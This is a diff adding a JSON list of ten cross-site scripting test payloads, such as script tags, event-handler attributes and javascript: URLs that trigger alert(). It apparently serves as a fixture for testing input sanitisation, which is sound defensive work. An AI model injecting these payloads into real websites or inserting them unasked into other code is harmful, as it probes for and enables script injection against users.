@@ -1,0 +1,12 @@
+[
+  "<script>alert('XSS')</script>",
+  "<img src=x onerror=alert(1)>",
+  "<svg/onload=alert('XSS')>",
+  "<body onload=alert('XSS')>",
+  "<iframe src=javascript:alert('XSS')>",
+  "<a href=javascript:alert('XSS')>Click Me</a>",
+  "<div onmouseover=alert('XSS')>Hover Me</div>",
+  "<input type=text value='<script>alert(1)</script>'>",
+  "<marquee onstart=alert('XSS')>Hello</marquee>",
+  "<video><source onerror=alert('XSS')>"
+]
